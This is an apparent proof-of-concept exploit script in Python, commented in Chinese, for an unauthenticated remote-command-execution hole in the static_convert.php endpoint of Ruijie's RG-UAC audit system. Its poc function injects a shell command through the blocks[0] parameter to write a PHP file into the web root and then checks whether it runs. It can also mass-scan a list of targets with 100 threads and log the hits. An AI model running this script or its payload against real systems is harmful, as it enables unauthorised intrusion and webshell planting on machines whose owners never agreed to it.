#锐捷统一上网行为管理与审计系统 static_convert.php 前台RCE漏洞
#锐捷统一上网行为管理与审计系统 static_convert.php 接口存在远程命令执行漏洞，未经身份验证的远程攻击者可以利用此漏洞执行任意指令或写入webshell，导致服务器权限被控，造成严重威胁。
#title="RG-UAC登录页面"RJ_Unified Internet behavior management and audit system
import requests,re,argparse,sys,time,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()# 解除警告
from colorama import Fore, Style
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
def banner():
    banner ="""

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░ ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░ ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█  ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█  ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓  ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒   ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░   ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░      ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░     ░    
                                    author:           🐖sawa🐇
                                    version:          1.0.0
                                    For:              锐捷统一上网行为管理与审计系统前台RCE漏洞░                                                     
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="锐捷统一上网行为管理与审计系统前台RCE漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','-file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))

def poc(target):
    payload_url = '/view/IPV6/naborTable/static_convert.php?blocks[0]=|echo%20%27<?php%20system("id");unlink(__FILE__);?>%27%20>/var/www/html/rce.php'
    url = target+payload_url
    url1 = target+'/rce.php'
    headers = {
        'Accept': 'application/json, text/javascript, */*',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Connection':'close',
        }
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=5)
        res1 = requests.get(url=url1,verify=False,timeout=5)
        if res.status_code == 200 and 'id' in res.text and res1.status_code == 200:
            print(f"{BLUE}[+]该{target}存在漏洞,访问验证:{url1}{RESET}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(url1+"\n")
                return True
        else:
            print(f"[-]该{target}不存在漏洞")
            return False
    except Exception as e:
        print(f"[*]该url存在问题{target}"+str(e))
        return False

if __name__ == '__main__':
    main()
